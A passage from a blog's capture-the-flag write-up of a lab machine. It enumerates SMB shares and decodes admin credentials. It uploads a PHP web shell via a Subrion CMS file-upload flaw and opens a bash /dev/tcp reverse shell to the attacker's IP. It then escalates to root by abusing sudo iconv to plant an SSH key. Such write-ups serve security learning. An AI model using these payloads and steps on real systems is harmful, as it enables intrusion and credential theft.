</span></span></code></pre></div><ul><li>Command: <code>smbclient -L \\\\10.10.182.202\\ -N</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ smbclient -L <span style=color:#ae81ff>\\\\</span>10.10.182.202<span style=color:#ae81ff>\\</span> -N
</span></span><span style=display:flex><span>                               
</span></span><span style=display:flex><span>        Sharename       Type      Comment                                                                                     
</span></span><span style=display:flex><span>        ---------       ----      -------
</span></span><span style=display:flex><span>        print$          Disk      Printer Drivers
</span></span><span style=display:flex><span>        websvr          Disk                               
</span></span><span style=display:flex><span>        IPC$            IPC       IPC Service <span style=color:#f92672>(</span>TechSupport server <span style=color:#f92672>(</span>Samba, Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>Reconnecting with SMB1 <span style=color:#66d9ef>for</span> workgroup listing.
</span></span><span style=display:flex><span>                               
</span></span><span style=display:flex><span>        Server               Comment                        
</span></span><span style=display:flex><span>        ---------            -------                      
</span></span><span style=display:flex><span>                               
</span></span><span style=display:flex><span>        Workgroup            Master
</span></span><span style=display:flex><span>        ---------            -------
</span></span><span style=display:flex><span>        WORKGROUP
</span></span></code></pre></div><p>We will try to view the contents of the <code>websvr</code> share and download any existing files.</p><ul><li>Command: <code>smbclient \\\\10.10.182.202\\websvr -N</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ smbclient <span style=color:#ae81ff>\\\\</span>10.10.182.202<span style=color:#ae81ff>\\</span>websvr -N
</span></span><span style=display:flex><span>Try <span style=color:#e6db74>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> dir
</span></span><span style=display:flex><span>  .                                   D        <span style=color:#ae81ff>0</span>  Sat May <span style=color:#ae81ff>29</span> 10:17:38 <span style=color:#ae81ff>2021</span>
</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#ae81ff>0</span>  Sat May <span style=color:#ae81ff>29</span> 10:03:47 <span style=color:#ae81ff>2021</span>
</span></span><span style=display:flex><span>  enter.txt                           N      <span style=color:#ae81ff>273</span>  Sat May <span style=color:#ae81ff>29</span> 10:17:38 <span style=color:#ae81ff>2021</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#ae81ff>8460484</span> blocks of size 1024. <span style=color:#ae81ff>5678116</span> blocks available
</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> get enter.txt
</span></span><span style=display:flex><span>getting file <span style=color:#ae81ff>\e</span>nter.txt of size <span style=color:#ae81ff>273</span> as enter.txt <span style=color:#f92672>(</span>1.0 KiloBytes/sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average 1.0 KiloBytes/sec<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Below we see the contents of the <code>enter.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>GOALS</span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>)<span style=color:#a6e22e>Make</span> <span style=color:#a6e22e>fake</span> <span style=color:#a6e22e>popup</span> <span style=color:#a6e22e>and</span> <span style=color:#a6e22e>host</span> <span style=color:#a6e22e>it</span> <span style=color:#a6e22e>online</span> <span style=color:#a6e22e>on</span> <span style=color:#a6e22e>Digital</span> <span style=color:#a6e22e>Ocean</span> <span style=color:#a6e22e>server</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>)<span style=color:#a6e22e>Fix</span> <span style=color:#a6e22e>subrion</span> <span style=color:#a6e22e>site</span>, <span style=color:#960050;background-color:#1e0010>/subrion doesn&#39;t work, edit from panel</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>)<span style=color:#a6e22e>Edit</span> <span style=color:#a6e22e>wordpress</span> <span style=color:#a6e22e>website</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>IMP</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Subrion</span> <span style=color:#a6e22e>creds</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|-&gt;</span><span style=color:#a6e22e>admin</span><span style=color:#f92672>:</span><span style=color:#ae81ff>7</span><span style=color:#a6e22e>sKvntXdPEJaxazce9PXi24zaFrLiKWCk</span> [<span style=color:#a6e22e>cooked</span> <span style=color:#66d9ef>with</span> <span style=color:#a6e22e>magical</span> <span style=color:#a6e22e>formula</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>Wordpress</span> <span style=color:#a6e22e>creds</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|-&gt;</span>
</span></span></code></pre></div><p>The password can be found by the <code>Magic</code> operation from: <a href=https://gchq.github.io/CyberChef/>https://gchq.github.io/CyberChef/</a> or decoded from <code>base58</code>, then decoded from <code>base32</code> and finally decoded from <code>base64</code>.</p><ul><li>Command: <code>echo "7sKvntXdPEJaxazce9PXi24zaFrLiKWCk" | base58 -d | base32 -d | base64 -d</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ echo <span style=color:#e6db74>&#34;7sKvntXdPEJaxazce9PXi24zaFrLiKWCk&#34;</span> | base58 -d | base32 -d | base64 -d                                            
</span></span><span style=display:flex><span>Scam2021
</span></span></code></pre></div><p>So the credentials for <code>subrion</code> site are: <code>admin:Scam2021</code>.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>If we navigate to <code>http://10.10.182.202/subrion</code> we are redirected, so we can try the <code>panel</code> as stated at <code>enter.txt</code>.
So, we navigate to <code>http://10.10.182.202/subrion/panel</code>, we see a login page and log in with the found credentials <code>admin:Scam2021</code>.</p><p>This is an instance of <code>Subrion CMS v 4.2.1</code>, so we can search for public exploits with <code>searchsploit</code> on that version.</p><ul><li>Command: <code>searchsploit subrion 4.2.1</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ searchsploit subrion 4.2.1
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                                              |  Path
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Subrion 4.2.1 - <span style=color:#e6db74>&#39;Email&#39;</span> Persistant Cross-Site Scripting                                     | php/webapps/47469.txt
</span></span><span style=display:flex><span>Subrion CMS 4.2.1 - <span style=color:#e6db74>&#39;avatar[path]&#39;</span> XSS                                                      | php/webapps/49346.txt
</span></span><span style=display:flex><span>Subrion CMS 4.2.1 - Arbitrary File Upload                                                   | php/webapps/49876.py
</span></span><span style=display:flex><span>Subrion CMS 4.2.1 - Cross Site Request Forgery <span style=color:#f92672>(</span>CSRF<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>Add Amin<span style=color:#f92672>)</span>                            | php/webapps/50737.txt
</span></span><span style=display:flex><span>Subrion CMS 4.2.1 - Cross-Site Scripting                                                    | php/webapps/45150.txt
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><p>The most interesting is <code>php/webapps/49876.py</code>. After reading the code, we should upload a webshell with <code>.phar</code> extension, which is basically a <code>PHP</code> file.</p><p>So, we create a file called <code>cmd.phar</code> with contents:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>($_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>In order to upload the file, we select <code>Content</code>, then <code>Uploads</code> and click on <code>Upload files</code>. Then, we select the <code>cmd.phar</code> file.</p><p>After uploading the file, it is shown in the Dashboard. We <code>right-click</code> the file and select <code>Get info</code>. We are provided with a link for the uploaded file which is: <code>http://10.10.182.202/subrion/uploads/cmd.phar</code>.</p><p>So, to verify <code>command execution</code> we navigate to <code>http://10.10.182.202/subrion/uploads/cmd.phar?cmd=id</code>.</p><p>The output is: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>, so we can get a reverse shell through Burp Suite.</p><p>Refresh the page and <code>Intercept</code> with Burp. Then replace the <code>id</code> command with <code>bash -c 'exec bash -i >& /dev/tcp/10.8.16.74/443 0>&1'</code> and URL-encode it with <code>Ctrl-U</code>.</p><p>So the request should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>GET /subrion/uploads/cmd.phar?cmd<span style=color:#f92672>=</span>bash+-c+<span style=color:#e6db74>&#39;exec+bash+-i+&gt;%26+/dev/tcp/10.8.16.74/443+0&gt;%261&#39;</span> HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.182.202
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Cookie: INTELLI_06c8042c3d<span style=color:#f92672>=</span>2vg4i4doqntpnij1dihsfbsqd3; loader<span style=color:#f92672>=</span>loaded
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>Then, open a netcat listener and we have a reverse shell as <code>www-data</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.8.16.74<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.182.202<span style=color:#f92672>]</span> <span style=color:#ae81ff>51060</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>1381<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@TechSupport:/var/www/html/subrion/uploads$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>&lt;ww/html/subrion/uploads$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>     
</span></span><span style=display:flex><span>www-data@TechSupport:/var/www/html/subrion/uploads$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>geobour98@kali:~$ stty raw -echo;fg                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>  + continued  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;ww/html/subrion/uploads$ export TERM<span style=color:#f92672>=</span>xterm-256color                         
</span></span><span style=display:flex><span>www-data@TechSupport:/var/www/html/subrion/uploads$ stty rows <span style=color:#ae81ff>27</span> cols <span style=color:#ae81ff>126</span>
</span></span></code></pre></div><p>Now we have a fully interactive TTY shell.</p><p>After enumeration, we find an interesting file <code>wp-config.php</code> at <code>/var/www/html/wordpress</code>, which contains potential database credentials.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span><span style=display:flex><span>/** The name of the database <span style=color:#66d9ef>for</span> WordPress */                                                                                 
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span> <span style=color:#e6db74>&#39;DB_NAME&#39;</span>, <span style=color:#e6db74>&#39;wpdb&#39;</span> <span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/** MySQL database username */
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span> <span style=color:#e6db74>&#39;DB_USER&#39;</span>, <span style=color:#e6db74>&#39;support&#39;</span> <span style=color:#f92672>)</span>; 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/** MySQL database password */
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span> <span style=color:#e6db74>&#39;DB_PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;[REDACTED]&#39;</span> <span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span></code></pre></div><p>We can try the found password for the user <code>scamsite</code>, that can be found from either <code>/etc/passwd</code> or <code>/home/scamsite</code>.</p><p>The password is valid, so we can login with <code>SSH</code> as the user <code>scamsite</code>.</p><ul><li>Command: <code>ssh scamsite@10.10.182.202</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ The authenticity of host <span style=color:#e6db74>&#39;10.10.182.202 (10.10.182.202)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ED25519 key fingerprint is SHA256:J/HR9GKX4ReRvs4I9fnMwmJrOTL5B3skZ4owxwxWoyM.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>This key is not known by any other names.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span>10.10.182.202<span style=color:#e6db74>&#39; (ED25519) to the list of known hosts.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>scamsite@10.10.182.202&#39;</span>s password: 
</span></span><span style=display:flex><span>Welcome to Ubuntu 16.04.7 LTS <span style=color:#f92672>(</span>GNU/Linux 4.4.0-186-generic x86_64<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>120</span> packages can be updated.
</span></span><span style=display:flex><span><span style=color:#ae81ff>88</span> updates are security updates.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Last login: Fri May <span style=color:#ae81ff>28</span> 23:30:20 <span style=color:#ae81ff>2021</span>
</span></span><span style=display:flex><span>scamsite@TechSupport:~$
</span></span></code></pre></div><p>Now we are the user <code>scamsite</code>.</p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>After executing the command: <code>sudo -l</code> we see that we can execute <code>/usr/bin/iconv</code> as root without being asked for root password.</p><p>We can easily read the <code>root.txt</code> file by executing the following command found at: <a href=https://gtfobins.github.io/gtfobins/iconv/#sudo>https://gtfobins.github.io/gtfobins/iconv/#sudo</a>.</p><ul><li>Command: <code>sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "/root/root.txt"</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 <span style=color:#e6db74>&#34;/root/root.txt&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><br><style type=text/css>.notice{--root-color:#444;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#c33;--warning-content:#fee;--info-title:#fb7;--info-content:#fec;--note-title:#6be;--note-content:#e7f2fa;--tip-title:#5a5;--tip-content:#efe}@media(prefers-color-scheme:dark){.notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}}body.dark .notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--root-color);background:var(--root-background)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background)}.notice.warning .notice-title{background:var(--warning-title)}.notice.warning{background:var(--warning-content)}.notice.info .notice-title{background:var(--info-title)}.notice.info{background:var(--info-content)}.notice.note .notice-title{background:var(--note-title)}.notice.note{background:var(--note-content)}.notice.tip .notice-title{background:var(--tip-title)}.notice.tip{background:var(--tip-content)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative}</style><div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379.0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628.0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628.0l-22.627 22.627c-6.248 6.248-6.248 16.379.0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937.0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154.0l239.94 416.028zM288 354c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196.0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627.0 12 5.373 12 12v1e2h12c6.627.0 12 5.373 12 12v24z"/></symbol></svg></div><div class="notice note"><p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#note-notice"/></svg></span>Note</p><h3 id=root-shell>Root Shell<a hidden class=anchor aria-hidden=true href=#root-shell>#</a></h3><p>We could read root&rsquo;s private SSH key and log in with SSH providing the <code>id_rsa</code>, but we are asked for password.</p><p>So, we can create our SSH keys, put the public key in <code>/root/.ssh/authorized_keys</code> and log in as <code>root</code>.</p></div><ul><li>Command: <code>ssh-keygen -t rsa</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ ssh-keygen -t rsa                                                   
</span></span><span style=display:flex><span>Generating public/private rsa key pair.                                 
</span></span><span style=display:flex><span>Enter file in which to save the key <span style=color:#f92672>(</span>/home/geobour98/.ssh/id_rsa<span style=color:#f92672>)</span>: ./id_rsa                                                                      
</span></span><span style=display:flex><span>Enter passphrase <span style=color:#f92672>(</span>empty <span style=color:#66d9ef>for</span> no passphrase<span style=color:#f92672>)</span>:                  
</span></span><span style=display:flex><span>Enter same passphrase again:                                            
</span></span><span style=display:flex><span>Your identification has been saved in ./id_rsa              
</span></span><span style=display:flex><span>Your public key has been saved in ./id_rsa.pub              
</span></span><span style=display:flex><span>The key fingerprint is:                                                 
</span></span><span style=display:flex><span>SHA256:ycc38+YTseWCT87FV6KlIX8V5Y9gFdLRRBgg1hSI0YA geobour98@kali
</span></span><span style=display:flex><span>The key<span style=color:#960050;background-color:#1e0010>&#39;</span>s randomart image is:                                                                                                                    +---<span style=color:#f92672>[</span>RSA 3072<span style=color:#f92672>]</span>----+                                                                                                                              |       .o<span style=color:#f92672>=</span>o<span style=color:#f92672>+=</span>+<span style=color:#f92672>=</span>O<span style=color:#f92672>=</span>|                                                                                                                              |      E ..o..ooo.|                                                                                                                              
</span></span><span style=display:flex><span>|            o   o|                                                     
</span></span><span style=display:flex><span>|       . o....+.<span style=color:#f92672>=</span>|                                                     
</span></span><span style=display:flex><span>|        S oo+*.Oo|                 
</span></span><span style=display:flex><span>|         . .<span style=color:#f92672>=</span>+* <span style=color:#f92672>=</span>|                                                     
</span></span><span style=display:flex><span>|             *o+.|
</span></span><span style=display:flex><span>|             o<span style=color:#f92672>=</span>  |                                                     
</span></span><span style=display:flex><span>|              .. |                                                     
</span></span><span style=display:flex><span>+----<span style=color:#f92672>[</span>SHA256<span style=color:#f92672>]</span>-----+
</span></span></code></pre></div><p>Two files are created: <code>id_rsa</code> (private key) and <code>id_rsa.pub</code> (public key).</p><p>We copy the contents of <code>id_rsa.pub</code> and run as the <code>scamsite</code> user in the SSH session the following command using <code>iconv</code> again but with the option <code>-o</code> in order to create a file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>scamsite@TechSupport:~$ echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEXbJCblmDCS9cWXLzrVNFMCH9YyZJPpik7xKp9fXrWn+9BjuIpCKSxJ5h1bz6TrSbDJB/tzszA8Y3GFwbT3N7frcD5FGnLKhhX9EFHMEFNJSaeLsLfPsfAL5+G9LTd2L27m227enaKOOpLUmPNuRLAduiAXLja7cTl19/9iuwtHGRMaLiXb2nVE+SuGpo5eO89xz0VsoYTXZXiiGBT8dn4Mi3inMs7EY6DLNXRU0uWM+cC/HBrmEIPZlphiXoqeY3kQv2vadYGDE22OhhkBAhhz97KC/2w/RUpfEmwgWncxZ124zRUj0insM9r/8Vmf0To7/ejkhp6UCQuOvMW67yJbQ7CCNxfggG3dGLbQkTC1lAjgb+pIg6rRfU+2w2nrol0PWFoCAmMaGUNQdJGtia8l6XMh8BkKYasV4SkIDC1ZbVM5vK8bRdneNtb4guZubKJbxVuDLQO61sxRcS0k0orDQ8zNNODloMFUKbYjrLjMhCRjihYd0JCNxbMWYnZqE=&#34;</span> | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o <span style=color:#e6db74>&#34;/root/.ssh/authorized_keys&#34;</span>
</span></span></code></pre></div><p>Then, we can login with our private SSH key as the <code>root</code> user.</p><ul><li>Command: <code>ssh -i id_rsa root@10.10.182.202</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ ssh -i id_rsa root@10.10.182.202
</span></span><span style=display:flex><span>Welcome to Ubuntu 16.04.7 LTS <span style=color:#f92672>(</span>GNU/Linux 4.4.0-186-generic x86_64<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>120</span> packages can be updated.
</span></span><span style=display:flex><span><span style=color:#ae81ff>88</span> updates are security updates.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Last login: Sun Nov <span style=color:#ae81ff>21</span> 11:17:57 <span style=color:#ae81ff>2021</span>
</span></span><span style=display:flex><span>root@TechSupport:~# whoami
</span></span><span style=display:flex><span>root
</span></span></code></pre></div><p>Proof of Concept (PoC image):
<img src=../../../thm/techsupp0rt1/techsupp0rt1.png alt="Olympus photo" style=width:700px;height:300px></p><ul class=post-tags><li><a href=https://geobour98.com/tags/linux/><strong>linux</strong></a></li><li><a href=https://geobour98.com/tags/web/><strong>web</strong></a><li><li><a href=https://geobour98.com/tags/smbclient/><strong>smbclient</strong></a></li><li><a href=https://geobour98.com/tags/base64/><strong>base64</strong></a><li><li><a href=https://geobour98.com/tags/subrion/><strong>subrion</strong></a></li><li><a href=https://geobour98.com/tags/php/><strong>php</strong></a></li><li><a href=https://geobour98.com/tags/file-upload/><strong>file-upload</strong></a></li><li><a href=https://geobour98.com/tags/wordpress/><strong>wordpress</strong></a></li><li><a href=https://geobour98.com/tags/ssh/><strong>ssh</strong></a></li><li><a href=https://geobour98.com/tags/sudo/><strong>sudo</strong></a></li><li><a href=https://geobour98.com/tags/iconv/><strong>iconv</strong></a></li></ul></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const 